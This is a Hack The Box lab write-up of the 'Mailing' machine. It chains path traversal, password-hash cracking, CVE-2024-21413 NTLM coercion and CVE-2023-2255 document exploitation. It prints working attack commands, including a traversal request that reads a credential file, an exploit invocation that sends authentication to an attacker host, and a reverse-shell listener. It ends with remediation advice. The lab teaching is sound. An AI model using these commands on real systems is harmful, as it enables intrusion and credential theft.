---
title: "Mailing — Path Traversal, Outlook NTLM Coercion, and LibreOffice Privilege Escalation"
seoTitle: "Mailing — Path Traversal, NTLM Coercion, and LibreOffice Escalation"
description: "A mail server path traversal exposes a configuration hash, and a crafted document triggers privileged code execution on a client host."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - path-traversal
  - ntlm
  - cve-2024-21413
  - cve-2023-2255
objective: "Chain an unauthenticated web path traversal, recovered mail credentials, NTLM coercion, and a document-processor flaw into privileged code execution."
tools:
  - rustscan
  - nmap
  - curl
  - hashcat
  - swaks
  - Responder
  - NetExec
  - evil-winrm
  - netcat
  - python3
skill: "Windows web path traversal, NTLM coercion, and document-processor privilege escalation"
outcome: "Mail-server credential recovery, a coerced NetNTLMv2 hash validated through WinRM, and code execution as a privileged local account"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows host running hMailServer and IIS |
| Starting position | Unauthenticated network access |
| Objective | Chain an unauthenticated web path traversal, recovered mail credentials, NTLM coercion, and a document-processor flaw into privileged code execution |
| Outcome | Mail-server credential recovery; user access via a coerced NetNTLMv2 hash; code execution as a privileged local account |

## Mail traversal, NTLM coercion, document exploit

Mailing is an Easy-rated Hack The Box Windows lab whose mail server and IIS website expose a path traversal, an unpatched mail client, and an unpatched document processor. A download endpoint reads `hMailServer.ini`, disclosing the administrator password hash; recovered offline, it authenticates to SMTP, from which a crafted Moniker-link email coerces a user's NetNTLMv2 authentication to an operator-controlled server. The captured hash recovers a WinRM credential, and a crafted ODT document exploits the document processor to execute code in a privileged local account's context. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). Two hand-offs, the interactive WinRM shell and the document delivery, are described as recorded without captured output.

**Attack path:** **Download-endpoint path traversal → hMailServer administrator hash recovery → authenticated SMTP → CVE-2024-21413 Moniker-link NTLM coercion → NetNTLMv2 recovery → WinRM user access → CVE-2023-2255 document payload → privileged local account execution**

## hMailServer host with unauthenticated access

- **Target:** a Windows host running hMailServer (SMTP, POP3, IMAP) and an IIS web server, with WinRM exposed.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** chain web-based information disclosure into authenticated email abuse, coerce NTLM authentication to capture a user hash, and escalate privileges through a vulnerable document processor.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: traversal to Moniker coercion to ODT execution

### 1. Service Enumeration

Observation: a full TCP scan exposes mail, web, SMB, and remote-management services on one host.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/<SCAN_OUTPUT>
```

Truncated scan output:

```text
25/tcp   open  smtp       hMailServer smtpd
80/tcp   open  http       Microsoft IIS httpd 10.0
110/tcp  open  pop3       hMailServer pop3d
143/tcp  open  imap       hMailServer imapd
445/tcp  open  smb
465/tcp  open  ssl/smtp   hMailServer smtpd
587/tcp  open  smtp       hMailServer smtpd
993/tcp  open  ssl/imap   hMailServer imapd
5985/tcp open  winrm
```

Significance: hMailServer provides the mail stack while IIS hosts the web application; exposed WinRM on 5985 gives a remote command channel once any Windows credential is recovered, and the SMB and submission ports widen the surface.

Result: nine services are identified, with the IIS website and hMailServer as the externally reachable targets.

### 2. Path Traversal to the hMailServer Configuration

Observation: the website names the mail server and publishes mailbox user names, and its download endpoint takes a user-supplied `file` value that is mapped to disk.

```bash
curl -v \
  'http://<TARGET_HOSTNAME>/download.php?file=../../../../Program%20Files/Common%20Files/microsoft%20shared/ink/Content.xml'
curl -s \
  'http://<TARGET_HOSTNAME>/download.php?file=../../../..//Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini'
```

Truncated output:

```ini
[Security]
AdministratorPassword=<ADMIN_PASSWORD_HASH>
```

Significance: the endpoint does not sanitize the `file` parameter, and URL-encoded traversal sequences escape the web root. In this deployment the mail server keeps its administrator credential in a readable configuration file, so a single unauthenticated request discloses it; the mailbox names visible on the site supply the recipient identity used later.

Result: the hMailServer administrator password hash is disclosed to an unauthenticated requester.

### 3. Credential Recovery and SMTP Validation

Observation: the disclosed value is a hash recoverable offline, and hMailServer exposes an authenticated submission service.

```bash
hashcat -m 0 '<ADMIN_PASSWORD_HASH>' /usr/share/wordlists/rockyou.txt
```

Truncated recovery output:

```text
<ADMIN_PASSWORD_HASH>:<ADMIN_PASSWORD>
```

The recovered credential authenticates to SMTP:

```bash
swaks \
  --auth-user 'administrator@<TARGET_HOSTNAME>' \
  --auth LOGIN \
  --auth-password '<ADMIN_PASSWORD>' \
  --quit-after AUTH \
  --server <TARGET_HOSTNAME>
```

```text
<- 235 authenticated.
```

Significance: offline recovery converts the disclosed hash into a usable cleartext password, and the `235` response confirms it is valid for SMTP and provides the authenticated mail identity required to send the crafted message in the next stage.

Result: the administrator credential is recovered and subsequently validated through SMTP authentication.

### 4. NTLM Coercion via CVE-2024-21413

Observation: CVE-2024-21413 is a Microsoft Outlook vulnerability in which crafted message content carrying a Moniker link forces an SMB authentication attempt to an operator-controlled server without user interaction.

```bash
sudo responder -I <ATTACK_INTERFACE>
python3 CVE-2024-21413.py \
  --server <TARGET_HOSTNAME> \
  --port 587 \
  --username administrator@<TARGET_HOSTNAME> \
  --password '<ADMIN_PASSWORD>' \
  --sender administrator@<TARGET_HOSTNAME> \
  --recipient <TARGET_USER>@<TARGET_HOSTNAME> \
  --url //<ATTACKER_IP>/<SHARE_NAME> \
  --subject <SUBJECT>
```

Captured output:

```text
<TARGET_USER>::<DOMAIN>:<NTLM_SERVER_CHALLENGE>
```

Significance: the crafted link renders as a local file path that the client resolves over SMB, so the recipient's machine authenticates to the listener without the user clicking an external URL; the result is a capturable NetNTLMv2 response.

Result: a NetNTLMv2 hash for `<TARGET_USER>` is captured on the operator-controlled server.

### 5. NetNTLMv2 Recovery and WinRM Access

Observation: the captured NetNTLMv2 response is crackable offline, and WinRM is exposed for remote management.

```bash
hashcat -m 5600 <CAPTURED_NTLMV2_FILE> /usr/share/wordlists/rockyou.txt
```

Truncated recovery output:

```text
<TARGET_USER>:<TARGET_USER_PASSWORD>
```

The recovered credential authenticates to WinRM:

```bash
nxc winrm <TARGET_HOSTNAME> -u '<TARGET_USER>' -p '<TARGET_USER_PASSWORD>'
```

```text
[+] <DOMAIN>\<TARGET_USER>:<TARGET_USER_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <TARGET_HOSTNAME> -u '<TARGET_USER>' -p '<TARGET_USER_PASSWORD>'
```

Significance: cracking the coerced response yields the account's cleartext password, and the `(Pwn3d!)` marker confirms the account holds remote-administrative WinRM access, which provides an interactive shell without further exploitation.

Result: interactive user-level access on the target is established as `<DOMAIN>\<TARGET_USER>`.

### 6. LibreOffice CVE-2023-2255: Privilege Escalation

Observation: local enumeration shows LibreOffice installed and reports version 7.4.0.1, which is vulnerable to CVE-2023-2255, where crafted documents using floating frames can load external content without the prompt I expected. In this environment, the document is processed by a more privileged user.

```powershell
type "C:\Program Files\LibreOffice\program\version.ini"
```

```text
MsiProductVersion=7.4.0.1
```

A payload pattern is embedded in the document; its encoded download-and-execute construction is summarized rather than reproduced.

```bash
python3 CVE-2023-2255.py \
  --cmd "<PRIVILEGED_PAYLOAD_PATTERN>" \
  --output <DOCUMENT_NAME>.odt
```

The document is delivered through the expected local workflow, and a listener catches the callback:

```bash
nc -nlvp <CALLBACK_PORT>
```

The shell returns in the privileged local-account context:

```text
UserName
======================
<DOMAIN>\<PRIVILEGED_LOCAL_ACCOUNT>
```

Significance: a document format that fetches external content without a prompt, opened by a higher-privileged user, turns a normal file-open into code execution in that user's security context: a direct privilege-boundary failure rather than a local kernel exploit.

Result: the callback returns as `<DOMAIN>\<PRIVILEGED_LOCAL_ACCOUNT>`, confirmed by the shell's identity output.

## Challenges and Decisions

No failed attempts, alternative approaches, or fixes are documented for this path; the traversal, mail-based coercion, and document exploit proceeded as the evidence shows.

## Outcome: mail credentials, WinRM user, privileged local code

The recorded results show authenticated mail access, a user credential validated through WinRM, and code execution as `<DOMAIN>\<PRIVILEGED_LOCAL_ACCOUNT>`. The embedded payload is summarized rather than reproduced.

## Recommendations: traversal, config secrets, weak hashes, NTLM coercion, and the document flaw

The findings lead to the recommendations below; no follow-up validation is documented.

1. **Path traversal in the download endpoint.** The `file` parameter accepted traversal sequences, letting an unauthenticated requester read `hMailServer.ini` and its administrator hash. *Recommendation:* resolve requested files against a fixed allowlist of identifiers, reject traversal sequences, and run the web service with least privilege. *Detection:* detect encoded traversal patterns (for example `../` and `%2e%2e`) and on reads of configuration or backup files.
2. **Secrets stored in a readable configuration file.** `hMailServer.ini` held the administrator credential that unlocked SMTP. *Recommendation:* keep administrative secrets out of files readable by the web tier, store them in a protected secret store, and rotate the disclosed credential. *Detection:* monitor access to configuration files and audit administrative SMTP authentication.
3. **Crackable password material.** Both the configuration hash and the coerced NetNTLMv2 response fell to an offline dictionary attack. *Recommendation:* enforce unique, high-entropy passwords for service and user accounts and disable NTLM where it is not required. *Detection:* detect repeated authentication failures and on successful logons from unexpected sources.
4. **Client NTLM coercion (CVE-2024-21413).** A crafted email forced an outbound SMB authentication without user interaction. *Recommendation:* patch Outlook, block outbound SMB (445) to untrusted networks, and require SMB signing. *Detection:* detect outbound SMB connections from workstations and on NTLM authentication to external hosts.
5. **Unpatched document processor (CVE-2023-2255).** LibreOffice 7.4.0.1 loaded external content from a crafted ODT without the expected prompt and executed code in a privileged user's context. *Recommendation:* patch document-processing software promptly, disable automatic external-content loading, and avoid opening untrusted documents under a privileged account. *Validation:* inventory installed document-processor versions against current advisories.

## References

- [Hack The Box — Mailing](https://app.hackthebox.com/machines/Mailing) (retired machine)
- [NVD — CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413) (Microsoft Outlook remote code execution)
- [Microsoft Security Response Center — CVE-2024-21413](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413) (vendor update guide)
- [NVD — CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255) (LibreOffice external-content loading)
- [The Document Foundation — CVE-2023-2255 advisory](https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/) (vendor advisory)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [curl — command-line tool and library](https://curl.se/docs/manpage.html)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [Swaks](https://github.com/jetmore/swaks) (SMTP transaction testing)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (remote authentication and WinRM operations)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Microsoft Learn — SMB signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing) (SMB signing requirements)
